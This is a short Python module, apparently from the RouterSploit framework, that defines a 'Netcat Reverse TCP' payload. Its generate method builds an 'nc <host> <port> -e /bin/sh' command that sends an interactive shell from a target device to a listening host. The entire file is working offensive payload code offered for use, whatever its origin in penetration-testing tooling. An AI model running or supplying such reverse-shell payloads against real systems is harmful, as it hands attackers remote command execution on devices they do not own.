from routersploit.core.exploit import *
from routersploit.core.exploit.payloads import GenericPayload, ReverseTCPPayloadMixin


class Payload(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Netcat Reverse TCP",
        "description": "Creates interactive tcp reverse shell by using netcat.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
    }

    cmd = OptString("nc", "Netcat binary")
    shell_binary = OptString("/bin/sh", "Shell")

    def generate(self):
        return "{} {} {} -e {}".format(self.cmd,
                                       self.lhost,
                                       self.lport,
                                       self.shell_binary)
